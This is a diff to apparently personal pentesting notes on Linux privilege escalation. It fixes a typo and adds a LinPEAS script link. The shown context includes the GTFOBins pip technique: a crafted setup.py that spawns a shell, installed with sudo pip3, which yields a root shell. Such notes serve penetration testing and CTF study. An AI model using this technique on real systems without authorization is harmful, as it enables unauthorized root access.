@@ -43,7 +43,7 @@ https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/
 https://www.hackingarticles.in/lxd-privilege-escalation/
 
 # pip
-`pip3 install <local_dir>` searches the local dir for a setup.py and executes it. Helpfull if pip is in the sudoers or sbit.
+`pip3 install <local_dir>` searches the local dir for a setup.py and executes it. Helpful if pip is in the sudoers or sbit.
 
 Alternative (https://gtfobins.github.io/gtfobins/pip/):
 ```
@@ -51,3 +51,6 @@ TF=$(mktemp -d)
 echo "import os;os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
 sudo -H /usr/bin/pip3 install $TF
 ```
+
+# LinPEAS
+https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh
